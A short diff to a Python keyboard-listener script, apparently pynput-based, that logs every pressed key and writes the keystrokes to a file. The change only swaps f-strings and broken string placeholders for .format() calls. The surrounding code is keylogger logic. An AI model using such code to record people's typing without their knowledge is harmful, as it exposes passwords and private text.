@@ -10,9 +10,9 @@ def on_press(key):
     write_file(keys)
 
     try:
-        print('alphanumeric key {key.char} pressed')
+        print('alphanumeric key {0} pressed'.format(key.char))
     except AttributeError:
-        print('special key {key} pressed')
+        print('special key {0} pressed'.format(key))
 
 
 def write_file(keys):
@@ -35,7 +35,7 @@ def write_file(keys):
 
 
 def on_release(key):
-    print(f'{key} released')
+    print('{0} released'.format(key))
     if key == Key.esc:
         # Stop listener
         return False
